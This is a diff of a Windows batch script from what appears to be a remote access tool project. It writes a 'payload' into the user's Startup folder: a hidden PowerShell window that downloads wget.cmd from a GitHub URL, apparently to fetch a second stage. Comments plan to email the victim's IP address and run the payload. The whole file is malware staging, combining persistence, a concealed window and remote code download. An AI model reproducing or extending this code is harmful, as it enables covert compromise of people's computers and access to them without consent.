@@ -8,12 +8,11 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 @REM move to startup directory
 cd %STARTUP%
 
-@REM To Do: build out stage 2 (build stage2 or download it through internet)
-@REM write playloads to startup 
-(
-    echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/wget.cmd -OutFile wget.cmd"
 
-) > wget.cmd
+@REM send email with IP address
+
+@REM write playloads to startup 
+echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/wget.cmd -OutFile wget.cmd"
 
 
 @REM run payload
